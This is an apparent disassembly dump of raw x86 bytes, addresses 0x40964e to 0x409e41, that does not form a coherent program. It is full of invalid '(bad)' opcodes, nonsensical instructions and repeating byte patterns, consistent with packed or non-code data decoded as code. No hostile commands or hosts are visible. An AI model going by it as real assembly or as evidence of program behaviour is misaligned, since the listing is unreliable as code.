  40964e:	leave  
  40964f:	xor    eax,0x8e202c7d
  409654:	inc    eax
  409655:	test   BYTE PTR [eax],al
  409657:	int3   
  409658:	bound  eax,QWORD PTR ds:0xcc840f41
  40965e:	inc    ebx
  40965f:	add    BYTE PTR [eax+0x0],al
  409662:	inc    eax
  409663:	inc    eax
  409664:	inc    eax
  409665:	int3   
  409666:	add    BYTE PTR ds:0x62404341,al
  40966c:	pop    eax
  40966d:	add    BYTE PTR [ebx+0x40],al
  409670:	bound  ecx,QWORD PTR [edi]
  409672:	inc    eax
  409673:	stc    
  409674:	or     eax,0x67e01e70
  409679:	pusha  
  40967a:	xchg   DWORD PTR [ebx+ecx*2+0x207d3bda],ecx
  409681:	and    BYTE PTR [ebp+eax*1+0x41],cl
  409685:	xchg   ebp,eax
  409686:	push   esi
  409687:	(bad)  
  409688:	pusha  
  409689:	(bad)  
  40968b:	fwait
  40968c:	ror    ah,0x34
  40968f:	jge    0x4096b6
  409691:	xor    eax,0xa87477de
  409696:	ret    0xe1c5
  409699:	inc    eax
  40969a:	mov    al,0x64
  40969c:	stc    
  40969d:	adc    DWORD PTR [eax+0x7d],ebp
  4096a0:	add    BYTE PTR cs:[eax],al
  4096a3:	inc    eax
  4096a4:	inc    eax
  4096a5:	cmovno eax,DWORD PTR ds:0x40056243
  4096ac:	int3   
  4096ad:	add    ah,cl
  4096af:	inc    eax
  4096b0:	inc    eax
  4096b1:	bound  eax,QWORD PTR [ecx+0x0]
  4096b4:	add    BYTE PTR [edi],cl
  4096b6:	inc    ebx
  4096b7:	inc    eax
  4096b8:	inc    eax
  4096b9:	add    BYTE PTR [ecx+0x43],al
  4096bc:	add    eax,0x40256240
  4096c1:	bound  eax,QWORD PTR [eax]
  4096c3:	mov    al,ds:0x419af838
  4096c8:	test   al,0x3b
  4096ca:	loope  0x409681
  4096cc:	mov    cl,0x8a
  4096ce:	inc    ebx
  4096cf:	sub    edx,DWORD PTR [eax]
  4096d1:	jge    0x409711
  4096d3:	and    edx,edi
  4096d5:	adc    eax,0x295894eb
  4096da:	and    DWORD PTR [edx-0x18],eax
  4096dd:	inc    edx
  4096de:	jbe    0x409744
  4096e0:	cmp    BYTE PTR [ebp-0x69],0x20
  4096e4:	jmp    0xc3518fb0
  4096e9:	and    BYTE PTR [eax],ch
  4096eb:	xor    bh,BYTE PTR [ebp+0x9]
  4096ee:	cwde   
  4096ef:	add    al,BYTE PTR [esp+edi*2+0x63]
  4096f3:	push   ebp
  4096f4:	jle    0x4096f0
  4096f6:	adc    eax,0x2be44acb
  4096fb:	jecxz  0x40971e
  4096fd:	mov    BYTE PTR [ecx-0x50],al
  409700:	add    eax,0x4140cc00
  409705:	inc    eax
  409706:	inc    ebx
  409707:	bound  esp,QWORD PTR ds:0x41400043
  40970d:	add    BYTE PTR [eax],al
  40970f:	add    eax,0x43624062
  409714:	inc    ecx
  409715:	inc    eax
  409716:	inc    eax
  409717:	inc    eax
  409718:	add    eax,0x40624340
  40971d:	add    eax,0x40664140
  409722:	fdivr  DWORD PTR [ebx+eiz*4+0xf]
  409726:	pop    ecx
  409727:	or     eax,0x57bf1542
  40972c:	sub    ah,BYTE PTR ds:0x42e44145
  409732:	mov    edi,0xca14a07c
  409737:	cdq    
  409738:	cli    
  409739:	inc    esi
  40973a:	mov    edi,0x52223150
  40973f:	fcom   QWORD PTR [esi+0x407bc638]
  409745:	xor    DWORD PTR [eax],ebp
  409747:	inc    ebx
  409748:	add    BYTE PTR ds:0x41107840,al
  40974e:	bound  eax,QWORD PTR [eax+0x40]
  409751:	sldt   WORD PTR [eax-0x34]
  409755:	js     0x4097b9
  409757:	add    eax,0x40664143
  40975c:	inc    ebx
  40975d:	add    BYTE PTR [ecx+0x5],al
  409760:	js     0x4097a2
  409762:	bound  eax,QWORD PTR [eax+0x0]
  409765:	inc    eax
  409766:	fs pop edi
  409768:	sub    DWORD PTR [eax+0x2e5360ba],ebp
  40976e:	stc    
  40976f:	mov    esi,0x337b4264
  409774:	mov    al,0x1b
  409776:	xchg   BYTE PTR [ecx+ebx*2+0x1d23f4b8],dl
  40977d:	repnz inc ebx
  40977f:	add    eax,0x257bfc57
  409784:	adc    ecx,DWORD PTR [eax-0x16]
  409787:	inc    ecx
  409788:	inc    ebx
  409789:	inc    eax
  40978a:	inc    eax
  40978b:	add    eax,0x434162
  409790:	inc    eax
  409791:	add    BYTE PTR [edx+0x5],ah
  409794:	inc    eax
  409795:	adc    BYTE PTR [edx+0x40],ah
  409798:	inc    ebx
  409799:	inc    ecx
  40979a:	add    eax,0x4340
  40979f:	add    eax,0x404162
  4097a4:	add    BYTE PTR [eax+0x43],al
  4097a7:	inc    eax
  4097a8:	add    eax,0xee626d47
  4097ad:	bound  eax,QWORD PTR [eax+0x7c]
  4097b0:	adc    cl,dl
  4097b2:	lods   al,BYTE PTR ds:[esi]
  4097b3:	les    edi,FWORD PTR [ebx-0x5d]
  4097b6:	popa   
  4097b7:	inc    ebx
  4097b8:	clc    
  4097b9:	aaa    
  4097ba:	fs dec edi
  4097bc:	fcom   DWORD PTR [ebx]
  4097be:	dec    eax
  4097bf:	cs test al,bh
  4097c2:	mov    es,WORD PTR [eax+0x7b]
  4097c5:	inc    eax
  4097c6:	test   eax,0x402d
  4097cb:	inc    ecx
  4097cc:	inc    ebx
  4097cd:	add    eax,0x41784062
  4097d2:	inc    eax
  4097d3:	inc    eax
  4097d4:	add    BYTE PTR [edi],cl
  4097d6:	bound  eax,QWORD PTR [ebx+0x0]
  4097d9:	add    eax,0x25006240
  4097de:	inc    eax
  4097df:	add    eax,0x40254143
  4097e4:	add    eax,0x15620000
  4097e9:	xchg   edx,eax
  4097ea:	ins    BYTE PTR es:[edi],dx
  4097eb:	inc    eax
  4097ec:	adc    ah,BYTE PTR [ecx+0x30]
  4097ef:	retf   0x6341
  4097f2:	rol    DWORD PTR [ecx],1
  4097f4:	jnp    0x4097bb
  4097f6:	jmp    0x409815
  4097f8:	xchg   edi,eax
  4097f9:	stos   DWORD PTR es:[edi],eax
  4097fa:	sbb    bl,BYTE PTR [ebp-0x1ccf12f5]
  409800:	inc    ebx
  409801:	add    BYTE PTR [eax],al
  409803:	add    BYTE PTR [ecx+0x40],al
  409806:	bound  esp,QWORD PTR [esi+0x0]
  409809:	inc    eax
  40980a:	add    eax,0x5400000
  40980f:	inc    ecx
  409810:	inc    eax
  409811:	inc    eax
  409812:	bound  esp,QWORD PTR ds:0x25050043
  409818:	inc    ecx
  409819:	inc    ebx
  40981a:	inc    eax
  40981b:	test   BYTE PTR [eax+0x0],al
  40981e:	bound  ebx,QWORD PTR [eax+0x62]
  409821:	inc    ecx
  409822:	inc    eax
  409823:	xchg   esp,eax
  409824:	nop
  409825:	cmp    al,0x90
  409827:	jnp    0x4097f7
  409829:	call   FWORD PTR [edi]
  40982b:	arpl   WORD PTR fs:[ebp+edi*2+0x76],bx
  409830:	jns    0x409862
  409832:	push   0xfffffffa
  409834:	test   eax,0xc47ac3ec
  409839:	jmp    ebx
  40983b:	or     BYTE PTR [esi-0x16fabfcf],0x30
  409842:	fwait
  409843:	or     eax,0x7a017449
  409848:	(bad)  
  409849:	call   DWORD PTR [esi-0x629c4e6b]
  40984f:	call   DWORD PTR gs:[ebx+0x2a]
  409853:	push   ebx
  409854:	mov    WORD PTR [ebx+0x62107a90],fs
  40985a:	inc    eax
  40985b:	inc    ecx
  40985c:	and    eax,0x40000500
  409861:	inc    ebx
  409862:	add    eax,0x40624041
  409867:	inc    ebx
  409868:	add    eax,0x43402541
  40986d:	bound  eax,QWORD PTR [eax+0x43]
  409870:	int3   
  409871:	inc    eax
  409872:	bound  eax,QWORD PTR [eax]
  409874:	inc    ecx
  409875:	inc    eax
  409876:	inc    eax
  409877:	add    eax,0x9f21c805
  40987c:	fs adc eax,0x355be3e4
  409882:	aas    
  409883:	dec    ecx
  409884:	stc    
  409885:	dec    ebx
  409886:	test   al,0x44
  409888:	jp     0x409852
  40988a:	jae    0x409869
  40988c:	cmp    dl,0x48
  40988f:	test   BYTE PTR [edi+edi*1+0x22],dl
  409893:	pop    edi
  409894:	add    eax,0x7ac335fa
  409899:	aas    
  40989a:	pusha  
  40989b:	aad    0xc4
  40989d:	sbb    eax,0xc94f4042
  4098a2:	ja     0x409906
  4098a4:	inc    eax
  4098a5:	and    eax,0x5406600
  4098aa:	inc    ebx
  4098ab:	inc    ecx
  4098ac:	inc    eax
  4098ad:	inc    eax
  4098ae:	inc    ebx
  4098af:	add    BYTE PTR [eax],al
  4098b1:	add    BYTE PTR [edx-0x34],ah
  4098b4:	inc    eax
  4098b5:	add    eax,0x40004041
  4098ba:	inc    ecx
  4098bb:	int3   
  4098bc:	add    BYTE PTR [ebx-0x7c],al
  4098bf:	add    eax,0x5406240
  4098c4:	bound  ebx,QWORD PTR [edx-0x29]
  4098c7:	stos   DWORD PTR es:[edi],eax
  4098c8:	push   es
  4098c9:	inc    eax
  4098ca:	jp     0x4098ff
  4098cc:	daa    
  4098cd:	dec    esi
  4098ce:	gs mov esp,0xc3475850
  4098d4:	jmp    0x664e9184
  4098d9:	cmp    BYTE PTR [edx+0x63],0xe1
  4098dd:	out    dx,eax
  4098de:	inc    eax
  4098df:	leave  
  4098e0:	gs test al,0x41
  4098e3:	inc    edx
  4098e4:	minps  xmm0,XMMWORD PTR [eax-0x60]
  4098e8:	call   0xe1621255
  4098ed:	and    eax,DWORD PTR [ebp+ecx*1+0x63]
  4098f1:	sub    bh,BYTE PTR [ecx-0x3d90cda9]
  4098f7:	int    0xe3
  4098f9:	inc    eax
  4098fa:	jns    0x409935
  4098fc:	inc    eax
  4098fd:	bound  ebx,QWORD PTR [eax+0x41]
  409900:	add    eax,0x40404340
  409905:	inc    ebx
  409906:	inc    eax
  409907:	test   BYTE PTR [eax],al
  409909:	add    eax,0x40624041
  40990e:	inc    eax
  40990f:	add    BYTE PTR [edx+0x5],ah
  409912:	inc    ebx
  409913:	add    BYTE PTR [eax+0x78],al
  409916:	inc    ecx
  409917:	add    BYTE PTR [eax+0x41],bl
  40991a:	bound  edi,QWORD PTR [ebx]
  40991c:	imul   BYTE PTR [ecx-0x5045564e]
  409922:	dec    eax
  409923:	xor    al,BYTE PTR [ebx]
  409925:	mov    al,0x5
  409927:	test   al,0x5
  409929:	jns    0x409918
  40992b:	aas    
  40992c:	lds    eax,FWORD PTR [ebp-0x37]
  40992f:	add    eax,0x1f6e9e86
  409934:	aaa    
  409935:	push   ds
  409936:	es inc eax
  409938:	test   BYTE PTR [eax],al
  40993a:	int3   
  40993b:	bound  eax,QWORD PTR ds:0xcc840f41
  409941:	inc    ebx
  409942:	add    BYTE PTR [eax+0x0],al
  409945:	inc    eax
  409946:	inc    eax
  409947:	inc    eax
  409948:	int3   
  409949:	add    BYTE PTR ds:0x62404341,al
  40994f:	pop    eax
  409950:	add    BYTE PTR [ebx+0x40],al
  409953:	bound  ecx,QWORD PTR [edi]
  409955:	inc    eax
  409956:	retf   
  409957:	jo     0x4099d2
  409959:	mov    ch,0xff
  40995b:	out    0x2c,al
  40995d:	or     BYTE PTR [eax-0x47],0x98
  409961:	pop    edi
  409962:	jmp    DWORD PTR [ebx+0x5437363]
  409968:	jns    0x4098eb
  40996a:	jae    0x409920
  40996c:	push   eax
  40996d:	mov    al,0xdf
  40996f:	xchg   BYTE PTR [edi-0x23039cbf],al
  409975:	adc    eax,0x27970dc
  40997a:	push   ds
  40997b:	push   0xb88a4ed1
  409980:	cmp    BYTE PTR [edi+0x41624ee2],0x34
  409987:	add    eax,0xb0210979
  40998c:	sub    eax,DWORD PTR [eax]
  40998e:	add    BYTE PTR [eax+0x40],al
  409991:	cmovno eax,DWORD PTR ds:0x40056243
  409998:	int3   
  409999:	add    ah,cl
  40999b:	inc    eax
  40999c:	inc    eax
  40999d:	bound  eax,QWORD PTR [ecx+0x0]
  4099a0:	add    BYTE PTR [edi],cl
  4099a2:	inc    ebx
  4099a3:	inc    eax
  4099a4:	inc    eax
  4099a5:	add    BYTE PTR [ecx+0x43],al
  4099a8:	add    eax,0x40256240
  4099ad:	bound  eax,QWORD PTR [eax]
  4099af:	shr    BYTE PTR [eax+0x1d09f086],0x9b
  4099b6:	enter  0x572,0x78
  4099ba:	jns    0x40993c
  4099bc:	loope  0x40998a
  4099be:	(bad)  
  4099bf:	cli    
  4099c0:	xchg   DWORD PTR [edi-0x74aff017],esi
  4099c6:	dec    esp
  4099c7:	scas   al,BYTE PTR es:[edi]
  4099c8:	push   0x57905
  4099cd:	int3   
  4099ce:	inc    eax
  4099cf:	inc    ecx
  4099d0:	inc    eax
  4099d1:	inc    ebx
  4099d2:	bound  esp,QWORD PTR ds:0x41400043
  4099d8:	add    BYTE PTR [eax],al
  4099da:	add    eax,0x43624062
  4099df:	inc    ecx
  4099e0:	inc    eax
  4099e1:	inc    eax
  4099e2:	inc    eax
  4099e3:	add    eax,0x40624340
  4099e8:	add    eax,0x40664140
  4099ed:	outs   dx,BYTE PTR ds:[esi]
  4099ee:	ja     0x409a4f
  4099f0:	popf   
  4099f1:	or     eax,0xa47b8641
  4099f6:	push   eax
  4099f7:	cmp    ecx,ebp
  4099f9:	inc    ecx
  4099fa:	popa   
  4099fb:	jb     0x409a76
  4099fd:	jae    0x409a7e
  4099ff:	xor    bh,ah
  409a01:	inc    edi
  409a02:	fdiv   QWORD PTR [esi+0x5c506e67]
  409a08:	inc    ebx
  409a09:	add    BYTE PTR ds:0x41107840,al
  409a0f:	bound  eax,QWORD PTR [eax+0x40]
  409a12:	sldt   WORD PTR [eax-0x34]
  409a16:	js     0x409a7a
  409a18:	add    eax,0x40664143
  409a1d:	inc    ebx
  409a1e:	add    BYTE PTR [ecx+0x5],al
  409a21:	js     0x409a63
  409a23:	bound  eax,QWORD PTR [eax+0x0]
  409a26:	inc    eax
  409a27:	pushf  
  409a28:	fsub   DWORD PTR [ebx+0x5]
  409a2b:	jns    0x4099e8
  409a2d:	jg     0x409aa6
  409a2f:	xor    al,0x73
  409a31:	add    BYTE PTR [esi+0x1f045162],0x40
  409a38:	stc    
  409a39:	xchg   ecx,eax
  409a3a:	aaa    
  409a3b:	jns    0x409a4a
  409a3d:	loope  0x409a44
  409a3f:	dec    eax
  409a40:	lods   al,BYTE PTR ds:[esi]
  409a41:	inc    edx
  409a42:	mov    ch,0x4f
  409a44:	ins    DWORD PTR es:[edi],dx
  409a45:	lahf   
  409a46:	stos   BYTE PTR es:[edi],al
  409a47:	pop    ecx
  409a48:	add    eax,0x367905c1
  409a4d:	dec    eax
  409a4e:	lods   eax,DWORD PTR ds:[esi]
  409a4f:	arpl   WORD PTR [ecx-0x38],ax
  409a52:	xchg   BYTE PTR [edx+0x17],cl
  409a55:	mov    al,ds:0x4257673f
  409a5a:	and    edi,DWORD PTR [eax+0x2]
  409a5d:	inc    ecx
  409a5e:	inc    ebx
  409a5f:	inc    eax
  409a60:	inc    eax
  409a61:	add    eax,0x434162
  409a66:	inc    eax
  409a67:	add    BYTE PTR [edx+0x5],ah
  409a6a:	inc    eax
  409a6b:	adc    BYTE PTR [edx+0x40],ah
  409a6e:	inc    ebx
  409a6f:	inc    ecx
  409a70:	add    eax,0x4340
  409a75:	add    eax,0x404162
  409a7a:	add    BYTE PTR [eax+0x43],al
  409a7d:	inc    eax
  409a7e:	add    eax,0xec00322e
  409a83:	and    DWORD PTR [edi+esi*4-0xf9fa9bd],esi
  409a8a:	clc    
  409a8b:	inc    DWORD PTR ds:0x34610078
  409a91:	bound  ebp,QWORD PTR [edx+0x17b286a8]
  409a97:	pop    ebp
  409a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a99:	lods   al,BYTE PTR ds:[esi]
  409a9a:	adc    eax,0x41000040
  409a9f:	inc    ebx
  409aa0:	add    eax,0x41784062
  409aa5:	inc    eax
  409aa6:	inc    eax
  409aa7:	add    BYTE PTR [edi],cl
  409aa9:	bound  eax,QWORD PTR [ebx+0x0]
  409aac:	add    eax,0x25006240
  409ab1:	inc    eax
  409ab2:	add    eax,0x40254143
  409ab7:	add    eax,0x10620000
  409abc:	bound  edi,QWORD PTR [eax+0x40]
  409abf:	pusha  
  409ac0:	xor    eax,0x40b457c1
  409ac5:	stc    
  409ac6:	jb     0x409ae7
  409ac8:	sub    BYTE PTR [edi+ebp*8+0x41],ch
  409acc:	push   ss
  409acd:	js     0x409b12
  409acf:	dec    esi
  409ad0:	retf   0xfa3e
  409ad3:	ret    0xf090
  409ad6:	and    BYTE PTR [ecx+0x1f],0x63
  409ada:	test   al,0x40
  409adc:	dec    esp
  409add:	js     0x409aee
  409adf:	inc    ecx
  409ae0:	out    dx,eax
  409ae1:	inc    ecx
  409ae2:	or     eax,0x43df8462
  409ae7:	add    BYTE PTR [eax],al
  409ae9:	add    BYTE PTR [ecx+0x40],al
  409aec:	bound  esp,QWORD PTR [esi+0x0]
  409aef:	inc    eax
  409af0:	add    eax,0x5400000
  409af5:	inc    ecx
  409af6:	inc    eax
  409af7:	inc    eax
  409af8:	bound  esp,QWORD PTR ds:0x25050043
  409afe:	inc    ecx
  409aff:	inc    ebx
  409b00:	inc    eax
  409b01:	test   BYTE PTR [eax+0x0],al
  409b04:	bound  ebx,QWORD PTR [eax+0x62]
  409b07:	inc    ecx
  409b08:	inc    eax
  409b09:	inc    eax
  409b0a:	pusha  
  409b0b:	pop    es
  409b0c:	in     al,dx
  409b0d:	push   edi
  409b0e:	sar    BYTE PTR [ebp-0x9dafb88],cl
  409b14:	gs out dx,eax
  409b16:	mov    al,ds:0xf614d76d
  409b1b:	pop    ebp
  409b1c:	sub    ecx,edi
  409b1e:	push   edx
  409b1f:	popf   
  409b20:	js     0x409b8d
  409b22:	cmp    esi,ebx
  409b24:	loope  0x409acc
  409b26:	inc    ebx
  409b27:	nop
  409b28:	sub    DWORD PTR [ebx+eiz*8+0x10596226],esp
  409b2f:	bound  eax,QWORD PTR [eax+0x41]
  409b32:	and    eax,0x40000500
  409b37:	inc    ebx
  409b38:	add    eax,0x40624041
  409b3d:	inc    ebx
  409b3e:	add    eax,0x43402541
  409b43:	bound  eax,QWORD PTR [eax+0x43]
  409b46:	int3   
  409b47:	inc    eax
  409b48:	bound  eax,QWORD PTR [eax]
  409b4a:	inc    ecx
  409b4b:	inc    eax
  409b4c:	inc    eax
  409b4d:	add    eax,0x78e1dc05
  409b52:	jb     0x409b95
  409b54:	call   0x6b20:0x3290b641
  409b5b:	and    dh,dh
  409b5d:	cwde   
  409b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b5f:	pusha  
  409b60:	jg     0x409bda
  409b62:	xchg   edi,eax
  409b63:	pusha  
  409b64:	xchg   DWORD PTR [ecx+0x15],esi
  409b67:	mov    DWORD PTR [ebx+0x4d],esp
  409b6a:	gs dec ebx
  409b6c:	dec    ebx
  409b6d:	test   al,0x57
  409b6f:	mov    ah,0x8c
  409b71:	js     0x409b04
  409b73:	mov    al,ds:0x84ee1147
  409b78:	add    eax,DWORD PTR [eax+eiz*2+0x69]
  409b7c:	adc    bl,BYTE PTR [edx+edi*8+0x62]
  409b80:	mov    cl,0x77
  409b82:	bound  eax,QWORD PTR [eax+0x25]
  409b85:	add    BYTE PTR [esi+0x40],ah
  409b88:	add    eax,0x40404143
  409b8d:	inc    ebx
  409b8e:	add    BYTE PTR [eax],al
  409b90:	add    BYTE PTR [edx-0x34],ah
  409b93:	inc    eax
  409b94:	add    eax,0x40004041
  409b99:	inc    ecx
  409b9a:	int3   
  409b9b:	add    BYTE PTR [ebx-0x7c],al
  409b9e:	add    eax,0x5406240
  409ba3:	bound  eax,QWORD PTR [edx]
  409ba5:	inc    eax
  409ba6:	ins    BYTE PTR es:[edi],dx
  409ba7:	inc    ecx
  409ba8:	mov    ds:0x6f969046,al
  409bad:	sub    eax,0x350d4593
  409bb2:	mov    edi,0xa76fe777
  409bb7:	xor    BYTE PTR [ebp+0x40],dl
  409bba:	fmul   DWORD PTR [ebp+0x413d2381]
  409bc0:	out    0xb8,eax
  409bc2:	ds jne 0x409be2
  409bc5:	xchg   ecx,eax
  409bc6:	rcr    DWORD PTR [eax+0x146241f9],1
  409bcc:	dec    edx
  409bcd:	inc    ecx
  409bce:	or     eax,0xc060a000
  409bd3:	jne    0x409bd5
  409bd5:	pusha  
  409bd6:	ret    
  409bd7:	test   al,0x5
  409bd9:	mov    BYTE PTR [eax+0x62],al
  409bdc:	pop    eax
  409bdd:	inc    ecx
  409bde:	add    eax,0x40404340
  409be3:	inc    ebx
  409be4:	inc    eax
  409be5:	test   BYTE PTR [eax],al
  409be7:	add    eax,0x40624041
  409bec:	inc    eax
  409bed:	add    BYTE PTR [edx+0x5],ah
  409bf0:	inc    ebx
  409bf1:	add    BYTE PTR [eax+0x78],al
  409bf4:	inc    ecx
  409bf5:	add    BYTE PTR [eax+0x41],bl
  409bf8:	bound  eax,QWORD PTR [esi+edi*2+0x6f]
  409bfc:	xor    ebp,DWORD PTR [eax+0x2dd24e12]
  409c02:	inc    eax
  409c03:	inc    eax
  409c04:	bound  esi,QWORD PTR [edx+0x74]
  409c07:	iret   
  409c08:	xchg   esp,eax
  409c09:	xchg   ebx,eax
  409c0a:	inc    eax
  409c0b:	jl     0x409bb4
  409c0d:	test   BYTE PTR [ecx+0x1c],0x52
  409c11:	inc    esp
  409c12:	inc    eax
  409c13:	dec    edi
  409c14:	push   eax
  409c15:	retf   
  409c16:	inc    ebp
  409c17:	clc    
  409c18:	scas   eax,DWORD PTR es:[edi]
  409c19:	in     eax,dx
  409c1a:	xor    al,0x99
  409c1c:	pusha  
  409c1d:	cmp    al,0x30
  409c1f:	pop    ds
  409c20:	xor    BYTE PTR [edi],dl
  409c22:	inc    eax
  409c23:	xor    eax,0x3541c168
  409c28:	retf   
  409c29:	cmp    al,0x41
  409c2b:	add    al,BYTE PTR [eax-0x7c]
  409c2e:	add    ah,cl
  409c30:	bound  eax,QWORD PTR ds:0xcc840f41
  409c36:	inc    ebx
  409c37:	add    BYTE PTR [eax+0x0],al
  409c3a:	inc    eax
  409c3b:	inc    eax
  409c3c:	inc    eax
  409c3d:	int3   
  409c3e:	add    BYTE PTR ds:0x62404341,al
  409c44:	pop    eax
  409c45:	add    BYTE PTR [ebx+0x40],al
  409c48:	bound  ecx,QWORD PTR [edi]
  409c4a:	inc    eax
  409c4b:	inc    eax
  409c4c:	sub    DWORD PTR [eax+0x5056b080],ebx
  409c52:	sub    ebx,DWORD PTR [edi]
  409c54:	in     al,dx
  409c55:	pextrw ebp,(bad),0xc5
  409c57:	test   al,0xb8
  409c59:	inc    eax
  409c5a:	inc    eax
  409c5b:	dec    ebp
  409c5c:	push   gs
  409c5e:	inc    eax
  409c5f:	adc    DWORD PTR [ecx+0x40],ebp
  409c62:	int3   
  409c63:	sub    al,BYTE PTR fs:[eax]
  409c66:	add    BYTE PTR [eax+0x40],al
  409c69:	cmovno eax,DWORD PTR ds:0x40056243
  409c70:	int3   
  409c71:	add    ah,cl
  409c73:	inc    eax
  409c74:	inc    eax
  409c75:	bound  eax,QWORD PTR [ecx+0x0]
  409c78:	add    BYTE PTR [edi],cl
  409c7a:	inc    ebx
  409c7b:	inc    eax
  409c7c:	inc    eax
  409c7d:	add    BYTE PTR [ecx+0x43],al
  409c80:	add    eax,0x40256240
  409c85:	bound  eax,QWORD PTR [eax]
  409c87:	adc    BYTE PTR [eax-0x44],al
  409c8a:	fadd   DWORD PTR [eax+0x2e]
  409c8d:	icebp  
  409c8e:	mov    ecx,0x4842536c
  409c93:	jle    0x409cfb
  409c95:	outs   dx,DWORD PTR ds:[esi]
  409c96:	push   ebx
  409c97:	inc    ecx
  409c98:	pop    ecx
  409c99:	shr    BYTE PTR ds:0x12430107,0x45
  409ca0:	add    eax,0x4140cc00
  409ca5:	inc    eax
  409ca6:	inc    ebx
  409ca7:	bound  esp,QWORD PTR ds:0x41400043
  409cad:	add    BYTE PTR [eax],al
  409caf:	add    eax,0x43624062
  409cb4:	inc    ecx
  409cb5:	inc    eax
  409cb6:	inc    eax
  409cb7:	inc    eax
  409cb8:	add    eax,0x40624340
  409cbd:	add    eax,0x40664140
  409cc2:	test   al,0xf4
  409cc4:	(bad)  
  409cc5:	jge    0x409d19
  409cc7:	and    eax,0x624830bb
  409ccc:	shr    BYTE PTR [edi-0x80],1
  409ccf:	inc    esp
  409cd0:	aam    0x41
  409cd2:	cmp    DWORD PTR [edx+eiz*2+0x78],eax
  409cd6:	pop    ds
  409cd7:	pusha  
  409cd8:	mov    ds,WORD PTR [eax-0x17b7d52c]
  409cde:	dec    ebx
  409cdf:	daa    
  409ce0:	neg    BYTE PTR [esi]
  409ce2:	or     al,0xbf
  409ce4:	sub    al,0x78
  409ce6:	sbb    BYTE PTR [eax],0x50
  409ce9:	test   al,0xcc
  409ceb:	sub    cl,BYTE PTR [esi-0x6ddecbcf]
  409cf1:	adc    DWORD PTR [edx+0x40],ecx
  409cf4:	mov    bh,0x78
  409cf6:	dec    ebx
  409cf7:	inc    edx
  409cf8:	mov    al,ds:0x40050043
  409cfd:	js     0x409d0f
  409cff:	inc    ecx
  409d00:	bound  eax,QWORD PTR [eax+0x40]
  409d03:	sldt   WORD PTR [eax-0x34]
  409d07:	js     0x409d6b
  409d09:	add    eax,0x40664143
  409d0e:	inc    ebx
  409d0f:	add    BYTE PTR [ecx+0x5],al
  409d12:	js     0x409d54
  409d14:	bound  eax,QWORD PTR [eax+0x0]
  409d17:	inc    eax
  409d18:	fs test eax,0x801d482a
  409d1e:	and    BYTE PTR [ecx+eax*2+0x78ee43b4],dl
  409d25:	daa    
  409d26:	and    DWORD PTR [ecx],eax
  409d28:	leave  
  409d29:	or     al,0x16
  409d2b:	fcom   DWORD PTR ds:0x3ce5502a
  409d31:	das    
  409d32:	and    al,0xd
  409d34:	js     0x409d44
  409d36:	and    DWORD PTR [edi+0x43410d62],esp
  409d3c:	inc    eax
  409d3d:	inc    eax
  409d3e:	add    eax,0x434162
  409d43:	inc    eax
  409d44:	add    BYTE PTR [edx+0x5],ah
  409d47:	inc    eax
  409d48:	adc    BYTE PTR [edx+0x40],ah
  409d4b:	inc    ebx
  409d4c:	inc    ecx
  409d4d:	add    eax,0x4340
  409d52:	add    eax,0x404162
  409d57:	add    BYTE PTR [eax+0x43],al
  409d5a:	inc    eax
  409d5b:	add    eax,0x302c952
  409d60:	sub    eax,0xd83c41a4
  409d65:	fdivr  QWORD PTR [eax-0x37]
  409d68:	imul   edx,DWORD PTR [edi+0xdc00798],0x8e1816f
  409d72:	sub    eax,0x40f484
  409d77:	add    BYTE PTR [ecx+0x43],al
  409d7a:	add    eax,0x41784062
  409d7f:	inc    eax
  409d80:	inc    eax
  409d81:	add    BYTE PTR [edi],cl
  409d83:	bound  eax,QWORD PTR [ebx+0x0]
  409d86:	add    eax,0x25006240
  409d8b:	inc    eax
  409d8c:	add    eax,0x40254143
  409d91:	add    eax,0xcb620000
  409d96:	js     0x409dde
  409d98:	inc    eax
  409d99:	mov    WORD PTR [eax+0x63466274],gs
  409d9f:	add    BYTE PTR [eax],ah
  409da1:	mov    esi,0x44f05312
  409da6:	js     0x409db6
  409da8:	sub    esi,edi
  409daa:	push   esp
  409dab:	ffree  st(0)
  409dad:	add    eax,0xeb1b425b
  409db2:	inc    ecx
  409db3:	dec    edi
  409db4:	adc    BYTE PTR [eax],ah
  409db6:	ja     0x409d38
  409db8:	bound  ebx,QWORD PTR [eax]
  409dba:	leave  
  409dbb:	dec    esp
  409dbc:	test   al,0x1
  409dbe:	xchg   ecx,eax
  409dbf:	add    DWORD PTR [esi+0x56],ebp
  409dc2:	cmp    al,0x67
  409dc4:	inc    eax
  409dc5:	xor    BYTE PTR [edi+0x40],dh
  409dc8:	xchg   sp,ax
  409dca:	bound  esi,QWORD PTR [edx+0x40]
  409dcd:	and    al,0x43
  409dcf:	add    BYTE PTR [eax],al
  409dd1:	add    BYTE PTR [ecx+0x40],al
  409dd4:	bound  esp,QWORD PTR [esi+0x0]
  409dd7:	inc    eax
  409dd8:	add    eax,0x5400000
  409ddd:	inc    ecx
  409dde:	inc    eax
  409ddf:	inc    eax
  409de0:	bound  esp,QWORD PTR ds:0x25050043
  409de6:	inc    ecx
  409de7:	inc    ebx
  409de8:	inc    eax
  409de9:	test   BYTE PTR [eax+0x0],al
  409dec:	bound  ebx,QWORD PTR [eax+0x62]
  409def:	inc    ecx
  409df0:	inc    eax
  409df1:	clc    
  409df2:	or     eax,0x2c418661
  409df7:	push   ebx
  409df8:	jle    0x409e71
  409dfa:	test   al,0x40
  409dfc:	lds    ebx,FWORD PTR [eax-0x295737f0]
  409e02:	inc    eax
  409e03:	pusha  
  409e04:	mov    dl,0x3c
  409e06:	xchg   esp,eax
  409e07:	sub    BYTE PTR [eax],dl
  409e09:	ja     0x409e2a
  409e0b:	outs   dx,DWORD PTR ds:[esi]
  409e0c:	adc    BYTE PTR [edx+0x40],ah
  409e0f:	inc    ecx
  409e10:	and    eax,0x40000500
  409e15:	inc    ebx
  409e16:	add    eax,0x40624041
  409e1b:	inc    ebx
  409e1c:	add    eax,0x43402541
  409e21:	bound  eax,QWORD PTR [eax+0x43]
  409e24:	int3   
  409e25:	inc    eax
  409e26:	bound  eax,QWORD PTR [eax]
  409e28:	inc    ecx
  409e29:	inc    eax
  409e2a:	inc    eax
  409e2b:	add    eax,0x47a87f05
  409e30:	inc    esp
  409e31:	inc    ecx
  409e32:	ss inc edx
  409e34:	xchg   esi,eax
  409e35:	(bad)  
  409e36:	adc    BYTE PTR [edi+0x7a],bl
  409e39:	push   ss
  409e3a:	ja     0x409e3c
  409e3c:	sub    eax,0x20b94c01
  409e41:	js     0x409e6f
